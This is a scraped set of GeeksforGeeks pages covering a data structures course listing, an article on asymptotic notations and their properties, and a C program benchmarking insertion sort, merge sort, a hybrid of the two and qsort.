and Build Heap Heap Sort Priority Queue in C++ PriorityQueue in Java Problems(With Video Solutions): Sort K-Sorted Array Buy Maximum Items with Given Sum K Largest Elements Merge K Sorted Arrays Median of a Stream Practice Problems This track contains many practice problems for the users which are considered important and must-do as far as Data Structure and Algorithm is concerned. Graph Introduction to Graph Graph Representation Adjacency Matrix Adjacency List in CPP and Java Adjacency Matrix VS List Breadth-First Search Applications Depth First Search Applications Problems(With Video Solutions): Shortest Path in an Unweighted Graph Detecting Cycle In the Undirected Graph In the Directed Graph Topological Sorting Kahn's BFS Based Algorithm DFS Based Algorithm Shortest Path in Directed Acyclic Graph Prim's Algorithm/Minimum Spanning Tree Implementation in CPP Implementation in Java Dijkstra's Shortest Path Algorithm Implementation in CPP Implementation in Java Bellman-Ford Shortest Path Algorithm Kosaraju's Algorithm Articulation Point Bridges in Graph Tarjan’s Algorithm Practice Problems This track contains many practice problems for the users which are considered important and must-do as far as Data Structure and Algorithm is concerned. Greedy Introduction Activity Selection Problem Fractional Knapsack Job Sequencing Problem Practice Problems This track contains many practice problems for the users which are considered important and must-do as far as Data Structure and Algorithm is concerned. Backtracking Concepts of Backtracking Rat In a Maze N Queen Problem Sudoku Problem Practice Problems This track contains many practice problems for the users which are considered important and must-do as far as Data Structure and Algorithm is concerned. Dynamic Programming Introduction Dynamic Programming Memoization Tabulation Problems(With Video Solutions): Longest Common Subsequence Coin Change Count Combinations Edit Distance Problem Naive Approach DP Approach Longest Increasing Subsequence Problem Naive Approach Efficient Approach Maximum Cuts Minimum coins to make a value Minimum Jumps to reach at the end 0-1 knapsack problem Naive Approach Efficient Approach Optimal Strategy for a Game Variation of Longest Common Subsequence Variation of Longest Increasing Subsequence Egg Dropping Problem Count BST with nkeys Maximum Sum with No Consecutive Subset Sum Problem Matrix Chain Multiplication Palindrome Parititioning Practice Problems This track contains many practice problems for the users which are considered important and must-do as far as Data Structure and Algorithm is concerned. Trie Introduction Representation Search Insert Delete Count Distinct Rows in a Binary Matrix Practice Problems This track contains many practice problems for the users which are considered important and must-do as far as Data Structure and Algorithm is concerned. Segment Tree Introduction Construction Range Query Update Query Practice Problems This track contains many practice problems for the users which are considered important and must-do as far as Data Structure and Algorithm is concerned. Disjoint Set Introduction Find and Union Operations Union by Rank Path Compression Kruskal's Algorithm Practice Problems This track contains many practice problems for the users which are considered important and must-do as far as Data Structure and Algorithm is concerned. Show More FAQs What does Self-Paced mean? You can join the course anytime. All of the content will be available once you get enrolled. You can finish it at your own decided speed. Is there any number to contact for any query? You may call us on our toll-free number: 1800 123 8622 or Drop us an email at geeks.classes@geeksforgeeks.org Does the course include programming questions? Yes, the course focuses on DS & Algo with a mix of theoretical lectures and programming questions. Do we have doubt support in this program? No, This program doesn't have doubt solving support. You may register for DSA- self-paced with Doubt solving. Is this a language-specific course? Yes, the course is only in C++ & Java. In case you are not familiar with these languages, you may join one of the free courses, Fork CPP and Fork Java to best utilize this course. What do I learn if I am a Python Programmer? If you are a Python programmer, you get the following. 1) The theory part of videos, algorithms in videos. Note video explanations of implementations are specific to C++ and Java only 2) Practice Questions will be in Python It is recommended to prepare yourself with Fork Python if you are beginning with Python How can I access contest solutions? Contest solutions are available in Video mode in the contest section itself. When can i access the video solution of Contest problems? Once you've appeared in the online contest you can access the solutions. How can I register for the course? You need to sign up for the course. After signing up, you need to pay when the payment link opens. What type of certificate will be offered in this program Once the course is completed. You'll be getting a course completion certificate. When can I make the payment for the course? The payment link will be available on the course page. Will the course content be available after the course end date? Yes, the Courses content come with a lifetime validity Is there a sample video to see how are the course videos? Yes, please see this video. Can I make the payment through PayPal? Yes. Mail us with your details at geeks.classes@geeksforgeeks.org. How long should one student take to complete the course? Although the course comes with lifetime validity, the average time that a student takes to complete it is 2 months. Course Registration Active Batches Batch Date Type Register DSA-self paced Active Online Classes Login to Register Testimonials × Data Structures and Algorithms 4.9 Close × Message Error Okay! × Please report if you are facing any issue on this page. Issue Type * Select Issue Content Related Issue Sofware Related Issue Examples of Content related issues .Software related issues .For queries regarding questions and quizzes, use the comment area below respective pages. Describe Your Issue * Attach Screenshot (optional) Send Close room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved

Analysis of Algorithms | Set 3 (Asymptotic Notations) - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Analysis of Algorithms | Set 2 (Worst, Average and Best Cases)Analysis of Algorithms | Set 3 (Asymptotic Notations)Analysis of Algorithms | Set 4 (Analysis of Loops)Analysis of Algorithm | Set 4 (Solving Recurrences)Analysis of Algorithm | Set 5 (Amortized Analysis Introduction)What does ‘Space Complexity’ mean?Pseudo-polynomial AlgorithmsNP-Completeness | Set 1 (Introduction)A Time Complexity QuestionMerge SortQuickSortHeapSortBinary HeapTime Complexity of building a heapApplications of Heap Data StructureBinomial HeapFibonacci Heap | Set 1 (Introduction)Fibonacci Heap – Insertion and UnionFibonacci Heap – Deletion, Extract min and Decrease keyLeftist Tree / Leftist HeapK-ary HeapIterative HeapSortAnalysis of Algorithms | Set 1 (Asymptotic Analysis)Complexity of different operations in Binary tree, Binary Search Tree and AVL treeUnderstanding Time Complexity with Simple Examples Analysis of Algorithms | Set 3 (Asymptotic Notations) Last Updated: 19-12-2020 We have discussed Asymptotic Analysis, and Worst, Average, and Best Cases of Algorithms. The main idea of asymptotic analysis is to have a measure of the efficiency of algorithms that don’t depend on machine-specific constants and doesn’t require algorithms to be implemented and time taken by programs to be compared. Asymptotic notations are mathematical tools to represent the time complexity of algorithms for asymptotic analysis. The following 3 asymptotic notations are mostly used to represent the time complexity of algorithms. 1) Θ Notation: The theta notation bounds a function from above and below, so it defines exact asymptotic behavior. A simple way to get Theta notation of an expression is to drop low order terms and ignore leading constants. For example, consider the following expression. 3n3 + 6n2 + 6000 = Θ(n3) Dropping lower order terms is always fine because there will always be a n0 after which Θ(n3) has higher values than Θn2) irrespective of the constants involved. For a given function g(n), we denote Θ(g(n)) is following set of functions. Θ(g(n)) = {f(n): there exist positive constants c1, c2 and n0 such that 0 <= c1*g(n) <= f(n) <= c2*g(n) for all n >= n0} The above definition means, if f(n) is theta of g(n), then the value f(n) is always between c1*g(n) and c2*g(n) for large values of n (n >= n0). The definition of theta also requires that f(n) must be non-negative for values of n greater than n0. 2) Big O Notation: The Big O notation defines an upper bound of an algorithm, it bounds a function only from above. For example, consider the case of Insertion Sort. It takes linear time in best case and quadratic time in worst case. We can safely say that the time complexity of Insertion sort is O(n^2). Note that O(n^2) also covers linear time. If we use Θ notation to represent time complexity of Insertion sort, we have to use two statements for best and worst cases: 1. The worst case time complexity of Insertion Sort is Θ(n^2). 2. The best case time complexity of Insertion Sort is Θ(n). The Big O notation is useful when we only have upper bound on time complexity of an algorithm. Many times we easily find an upper bound by simply looking at the algorithm. O(g(n)) = { f(n): there exist positive constants c and n0 such that 0 <= f(n) <= c*g(n) for all n >= n0} 3) Ω Notation: Just as Big O notation provides an asymptotic upper bound on a function, Ω notation provides an asymptotic lower bound. Ω Notation can be useful when we have lower bound on time complexity of an algorithm. As discussed in the previous post, the best case performance of an algorithm is generally not useful, the Omega notation is the least used notation among all three. For a given function g(n), we denote by Ω(g(n)) the set of functions. Ω (g(n)) = {f(n): there exist positive constants c and n0 such that 0 <= c*g(n) <= f(n) for all n >= n0}. Let us consider the same Insertion sort example here. The time complexity of Insertion Sort can be written as Ω(n), but it is not a very useful information about insertion sort, as we are generally interested in worst case and sometimes in average case. Properties of Asymptotic Notations : As we have gone through the definition of this three notations let’s now discuss some important properties of those notations. 1. General Properties : If f(n) is O(g(n)) then a*f(n) is also O(g(n)) ; where a is a constant. Example: f(n) = 2n²+5 is O(n²) then 7*f(n) = 7(2n²+5) = 14n²+35 is also O(n²) . Similarly this property satisfies for both Θ and Ω notation. We can say If f(n) is Θ(g(n)) then a*f(n) is also Θ(g(n)) ; where a is a constant. If f(n) is Ω (g(n)) then a*f(n) is also Ω (g(n)) ; where a is a constant. 2. Transitive Properties : If f(n) is O(g(n)) and g(n) is O(h(n)) then f(n) = O(h(n)) . Example: if f(n) = n, g(n) = n² and h(n)=n³ n is O(n²) and n² is O(n³) then n is O(n³) Similarly this property satisfies for both Θ and Ω notation. We can say If f(n) is Θ(g(n)) and g(n) is Θ(h(n)) then f(n) = Θ(h(n)) . If f(n) is Ω (g(n)) and g(n) is Ω (h(n)) then f(n) = Ω (h(n)) 3. Reflexive Properties : Reflexive properties are always easy to understand after transitive. If f(n) is given then f(n) is O(f(n)). Since MAXIMUM VALUE OF f(n) will be f(n) ITSELF ! Hence x = f(n) and y = O(f(n) tie themselves in reflexive relation always. Example: f(n) = n² ; O(n²) i.e O(f(n)) Similarly this property satisfies for both Θ and Ω notation. We can say that: If f(n) is given then f(n) is Θ(f(n)). If f(n) is given then f(n) is Ω (f(n)). 4. Symmetric Properties : If f(n) is Θ(g(n)) then g(n) is Θ(f(n)) . Example: f(n) = n² and g(n) = n² then f(n) = Θ(n²) and g(n) = Θ(n²) This property only satisfies for Θ notation. 5. Transpose Symmetric Properties : If f(n) is O(g(n)) then g(n) is Ω (f(n)). Example: f(n) = n , g(n) = n² then n is O(n²) and n² is Ω (n) This property only satisfies for O and Ω notations. 6. Some More Properties : 1.) If f(n) = O(g(n)) and f(n) = Ω(g(n)) then f(n) = Θ(g(n)) 2.) If f(n) = O(g(n)) and d(n)=O(e(n)) then f(n) + d(n) = O( max( g(n), e(n) )) Example: f(n) = n i.e O(n) d(n) = n² i.e O(n²) then f(n) + d(n) = n + n² i.e O(n²) 3.) If f(n)=O(g(n)) and d(n)=O(e(n)) then f(n) * d(n) = O( g(n) * e(n) ) Example: f(n) = n i.e O(n) d(n) = n² i.e O(n²) then f(n) * d(n) = n * n² = n³ i.e O(n³) _______________________________________________________________________________ Exercise: Which of the following statements is/are valid? 1. Time Complexity of QuickSort is Θ(n^2) 2. Time Complexity of QuickSort is O(n^2) 3. For any two functions f(n) and g(n), we have f(n) = Θ(g(n)) if and only if f(n) = O(g(n)) and f(n) = Ω(g(n)). 4. Time complexity of all computer algorithms can be written as Ω(1) Important Links : There are two more notations called little o and little omega. Little o provides strict upper bound (equality condition is removed from Big O) and little omega provides strict lower bound (equality condition removed from big omega) Analysis of Algorithms | Set 4 (Analysis of Loops) Recent Articles on analysis of algorithm. References:Lec 1 | MIT (Introduction to Algorithms) This article is contributed by Abhay Rathi. Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above. Attention reader! Don’t stop learning now. Get hold of all the important DSA concepts with the DSA Self Paced Course at a student-friendly price and become industry ready. My Personal Notes arrow_drop_up Save Recommended Posts:Analysis of Algorithms | Set 1 (Asymptotic Analysis)Properties of Asymptotic NotationsAsymptotic Analysis and comparison of sorting algorithmsAnalysis of algorithms | little o and little omega notationsAnalysis of Algorithms | Set 4 (Analysis of Loops)Analysis of Algorithms | Big-O analysisAnalysis of Algorithm | Set 5 (Amortized Analysis Introduction)Analysis of Algorithms | Set 5 (Practice Problems)Algorithms Sample Questions | Set 3 | Time Order AnalysisAnalysis of Algorithms | Set 2 (Worst, Average and Best Cases)Analysis of Algorithm | Set 4 (Solving Recurrences)Practice Questions on Time Complexity AnalysisAnalysis of different sorting techniquesTime Complexity Analysis | Tower Of Hanoi (Recursion)Amortized analysis for increment in counterComplexity Analysis of Binary SearchDifference between Posteriori and Priori analysisComplexity analysis of various operations of Binary Min HeapExamples of Big-O analysisAlgorithms | Recurrences | Set 1Improved By : OmkarJai, AmiyaRanjanRout, kaustubh765 Article Tags : AnalysisArticles thumb_up 145 To-do Done 1.7 Based on 273 vote(s) Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page NP-Completeness | Set 1 (Introduction) Next last_page Analysis of Algorithms | Set 4 (Analysis of Loops) Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Analysis Proof that Clique Decision problem is NP-Complete | Set 2Difference between NP hard and NP complete problemComplexity Analysis of Binary SearchPractice Questions on Time Complexity AnalysisTime complexity of recursive Fibonacci program Most visited in Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Tree Traversals (Inorder, Preorder and Postorder)Commonly Asked Data Structure Interview Questions | Set 1SQL | Join (Inner, Left, Right and Full Joins)Practice for cracking any coding interview room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Asymptotic Analysis and comparison of sorting algorithms - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Analysis of Algorithms | Set 1 (Asymptotic Analysis)Analysis of Algorithms | Set 2 (Worst, Average and Best Cases)Analysis of Algorithm | Set 4 (Solving Recurrences)Analysis of Algorithms | Set 3 (Asymptotic Notations)Analysis of Algorithms | Set 4 (Analysis of Loops)Time Complexity of building a heapUnderstanding Time Complexity with Simple ExamplesComplexity of different operations in Binary tree, Binary Search Tree and AVL treePractice Questions on Time Complexity AnalysisAnalysis of Algorithms | Big-O analysisAnalysis of different sorting techniquesTail RecursionNP-Completeness | Set 1 (Introduction)Complexity Analysis of Binary SearchAnalysis of Algorithm | Set 5 (Amortized Analysis Introduction)What does 'Space Complexity' mean?Analysis of Algorithms | Set 5 (Practice Problems)Analysis of algorithms | little o and little omega notationsLower and Upper Bound TheoryCyclomatic ComplexityA Time Complexity QuestionMeasure execution time with high precision in C/C++Time complexity of recursive Fibonacci programDifference between Recursion and IterationDifference between NP hard and NP complete problemDifference between Big Oh, Big Omega and Big ThetaIn-Place AlgorithmPseudo-polynomial AlgorithmsTime Complexity Analysis | Tower Of Hanoi (Recursion)Sort elements by frequency | Set 5 (using Java Map) Asymptotic Analysis and comparison of sorting algorithms Last Updated: 30-05-2018 It is a well established fact that merge sort runs faster than insertion sort. Using asymptotic analysis we can prove that merge sort runs in O(nlogn) time and insertion sort takes O(n^2). It is obvious because merge sort uses a divide-and-conquer approach by recursively solving the problems where as insertion sort follows an incremental approach. If we scrutinize the time complexity analysis even further, we’ll get to know that insertion sort isn’t that bad enough. Surprisingly, insertion sort beats merge sort on smaller input size. This is because there are few constants which we ignore while deducing the time complexity. On larger input sizes of the order 10^4 this doesn’t influence the behavior of our function. But when input sizes fall below, say less than 40, then the constants in the equation dominate the input size ‘n’. So far, so good. But I wasn’t satisfied with such mathematical analysis. As a computer science undergrad we must believe in writing code. I’ve written a C program to get a feel of how the algorithms compete against each other for various input sizes. And also, why such rigorous mathematical analysis is done on establishing running time complexities of these sorting algorithms. Implementation: filter_none edit close play_arrow link brightness_4 code //C++ code to compare performance of sorting algorithms #include <stdio.h> #include <stdlib.h> #include <stdbool.h> #include <time.h> #define MAX_ELEMENT_IN_ARRAY 1000000001 int cmpfunc (const void * a, const void * b) { // Compare function used by qsort return ( *(int*)a - *(int*)b ); } int* generate_random_array(int n) { srand(time(NULL)); int *a = malloc(sizeof(int) * n), i; for(i = 0; i < n; ++i) a[i] = rand() % MAX_ELEMENT_IN_ARRAY; return a; } int* copy_array(int a[], int n) { int *arr = malloc(sizeof(int) * n); int i; for(i = 0; i < n ;++i) arr[i] = a[i]; return arr; } //Code for Insertion Sort void insertion_sort_asc(int a[], int start, int end) { int i; for(i = start + 1; i <= end ; ++i) { int key = a[i]; int j = i - 1; while(j >= start && a[j] > key) { a[j + 1] = a[j]; --j; } a[j + 1] = key; } } //Code for Merge Sort void merge(int a[], int start, int end, int mid) { int i = start, j = mid + 1, k = 0; int *aux = malloc(sizeof(int) * (end - start + 1)); while(i <= mid && j <= end) { if(a[i] <= a[j]) aux[k++] = a[i++]; else aux[k++] = a[j++]; } while(i <= mid) aux[k++] = a[i++]; while(j <= end) aux[k++] = a[j++]; j = 0; for(i = start;i <= end;++i) a[i] = aux[j++]; free(aux); } void _merge_sort(int a[],int start,int end) { if(start < end) { int mid = start + (end - start) / 2; _merge_sort(a,start,mid); _merge_sort(a,mid + 1,end); merge(a,start,end,mid); } } void merge_sort(int a[],int n) { return _merge_sort(a,0,n - 1); } void insertion_and_merge_sort_combine(int a[], int start, int end, int k) { // Performs insertion sort if size of array is less than or equal to k // Otherwise, uses mergesort if(start < end) { int size = end - start + 1; if(size <= k) { //printf("Performed insertion sort- start = %d and end = %d\n", start, end); return insertion_sort_asc(a,start,end); } int mid = start + (end - start) / 2; insertion_and_merge_sort_combine(a,start,mid,k); insertion_and_merge_sort_combine(a,mid + 1,end,k); merge(a,start,end,mid); } } void test_sorting_runtimes(int size,int num_of_times) { // Measuring the runtime of the sorting algorithms int number_of_times = num_of_times; int t = number_of_times; int n = size; double insertion_sort_time = 0, merge_sort_time = 0; double merge_sort_and_insertion_sort_mix_time = 0, qsort_time = 0; while(t--) { clock_t start, end; int *a = generate_random_array(n); int *b = copy_array(a,n); start = clock(); insertion_sort_asc(b,0,n-1); end = clock(); insertion_sort_time += ((double) (end - start)) / CLOCKS_PER_SEC; free(b); int *c = copy_array(a,n); start = clock(); merge_sort(c,n); end = clock(); merge_sort_time += ((double) (end - start)) / CLOCKS_PER_SEC; free(c); int *d = copy_array(a,n); start = clock(); insertion_and_merge_sort_combine(d,0,n-1,40); end = clock(); merge_sort_and_insertion_sort_mix_time+=((double) (end - start))/CLOCKS_PER_SEC; free(d); start = clock(); qsort(a,n,sizeof(int),cmpfunc); end = clock(); qsort_time += ((double) (end - start)) / CLOCKS_PER_SEC; free(a); } insertion_sort_time /= number_of_times; merge_sort_time /= number_of_times; merge_sort_and_insertion_sort_mix_time /= number_of_times; qsort_time /= number_of_times; printf("\nTime taken to sort:\n" "%-35s %f\n" "%-35s %f\n" "%-35s %f\n" "%-35s %f\n\n", "(i)Insertion sort: ", insertion_sort_time, "(ii)Merge sort: ", merge_sort_time, "(iii)Insertion-mergesort-hybrid: ", merge_sort_and_insertion_sort_mix_time, "(iv)Qsort library function: ", qsort_time); } int main(int argc, char const *argv[]) { int t; scanf("%d", &t); while(t--) { int size, num_of_times; scanf("%d %d", &size, &num_of_times); test_sorting_runtimes(size,num_of_times); } return 0; } chevron_right filter_none I have compared the running times of the following algorithms: Insertion sort: The traditional algorithm with no modifications/optimisation. It performs very well for smaller input sizes. And yes, it does beat merge sort Merge sort: Follows the divide-and-conquer approach. For input sizes of the order 10^5 this algorithm is of the right choice. It renders insertion sort impractical for such large input sizes. Combined version of insertion sort and merge sort: I have tweaked the logic of merge sort a little bit to achieve a considerably better running time for smaller input sizes. As we know, merge sort splits its input into two halves until it is trivial enough to sort the elements. But here, when the input size falls below a threshold such as ’n’ < 40 then this hybrid algorithm makes a call to traditional insertion sort procedure. From the fact that insertion sort runs faster on smaller inputs and merge sort runs faster on larger inputs, this algorithm makes best use both the worlds. Quick sort: I have not implemented this procedure. This is the library function qsort() which is available in . I have considered this algorithm in order to know the significance of implementation. It requires a great deal of programming expertise to minimize the number of steps and make at most use of the underlying language primitives to implement an algorithm in the best way possible. This is the main reason why it is recommended to use library functions. They are written to handle anything and everything. They optimize to the maximum extent possible. And before I forget, from my analysis qsort() runs blazingly fast on virtually any input size! The Analysis: Input: The user has to supply the number of times he/she wants to test the algorithm corresponding to number of test cases. For each test case the user must enter two space separated integers denoting the input size ’n’ and the ‘num_of_times’ denoting the number of times he/she wants to run the analysis and take average. (Clarification: If ‘num_of_times’ is 10 then each of the algorithm specified above runs 10 times and the average is taken. This is done because the input array is generated randomly corresponding to the input size which you specify. The input array could be all sorted. Our it could correspond to the worst case .i.e. descending order. In order to avoid running times of such input arrays. The algorithm is run ‘num_of_times‘ and the average is taken.) clock() routine and CLOCKS_PER_SEC macro from is used to measure the time taken. Compilation: I have written the above code in Linux environment (Ubuntu 16.04 LTS). Copy the code snippet above. Compile it using gcc, key in the inputs as specified and admire the power of sorting algorithms! Results: As you can see for small input sizes, insertion sort beats merge sort by 2 * 10^-6 sec. But this difference in time is not so significant. On the other hand, the hybrid algorithm and qsort() library function, both perform as good as insertion sort. The input size is now increased by approximately 100 times to n = 1000 from n = 30. The difference is now tangible. Merge sort runs 10 times faster than insertion sort. There is again a tie between the performance of the hybrid algorithm and the qsort() routine. This suggests that the qsort() is implemented in a way which is more or less similar to our hybrid algorithm i.e., switching between different algorithms to make the best out of them. Finally, the input size is increased to 10^5 (1 Lakh!) which is most probably the ideal size used in practical scenario’s. Compared to the previous input n = 1000 where merge sort beat insertion sort by running 10 times faster, here the difference is even more significant. Merge sort beats insertion sort by 100 times! The hybrid algorithm which we have written in fact does out perform the traditional merge sort by running 0.01 sec faster. And lastly, qsort() the library function, finally proves us that implementation also plays a crucial role while measuring the running times meticulously by running 3 milliseconds faster! 😀 Note: Do not run the above program with n >= 10^6 since it will take a lot of computing power. Thank you and Happy coding! 🙂 This article is contributed by Aditya Ch. If you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks. Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above. Attention reader! Don’t stop learning now. Get hold of all the important DSA concepts with the DSA Self Paced Course at a student-friendly price and become industry ready. My Personal Notes arrow_drop_up Save Recommended Posts:Analysis of Algorithms | Set 1 (Asymptotic Analysis)Analysis of Algorithms | Set 3 (Asymptotic Notations)Lower bound for comparison based sorting algorithmsAnalysis of Algorithms | Set 4 (Analysis of Loops)Analysis of Algorithms | Big-O analysisSorting without comparison of elementsProperties of Asymptotic NotationsAnalysis of Algorithm | Set 5 (Amortized Analysis Introduction)Analysis of different sorting techniquesKnow Your Sorting Algorithm | Set 1 (Sorting Weapons used by Programming Languages)Know Your Sorting Algorithm | Set 2 (Introsort- C++’s Sorting Weapon)Sorting objects using In-Place sorting algorithmAnalysis of algorithms | little o and little omega notationsAnalysis of Algorithms | Set 2 (Worst, Average and Best Cases)Comparison among Bubble Sort, Selection Sort and Insertion SortAnalysis of Algorithms | Set 5 (Practice Problems)Algorithms Sample Questions | Set 3 | Time Order AnalysisDifference between Searching and Sorting AlgorithmsProgramming vs Coding - A Short Comparison Between BothStability in sorting algorithms Article Tags : AnalysisGBlogSorting Practice Tags : Sorting thumb_up 9 To-do Done 3.5 Based on 14 vote(s) Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page Position of an element after stable sort Next last_page OpenCV Python program for Vehicle detection in a Video frame Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Analysis Proof that Clique Decision problem is NP-Complete | Set 2Proof that SAT is NP CompleteProof that traveling salesman problem is NP HardPractice Set for Recurrence RelationsSet cover is NP Complete Most visited in GBlog 100 Days of Code - A Complete Guide For Beginners and ExperiencedWhy Java Language is Slower Than CPP for Competitive Programming?Socket Programming in C/C++GET and POST requests using PythonDifferences between Procedural and Object Oriented Programming room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Properties of Asymptotic Notations - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Analysis of Algorithms | Set 1 (Asymptotic Analysis)Analysis of Algorithms | Set 2 (Worst, Average and Best Cases)Analysis of Algorithm | Set 4 (Solving Recurrences)Analysis of Algorithms | Set 3 (Asymptotic Notations)Analysis of Algorithms | Set 4 (Analysis of Loops)Time Complexity of building a heapComplexity of different operations in Binary tree, Binary Search Tree and AVL treeUnderstanding Time Complexity with Simple ExamplesPractice Questions on 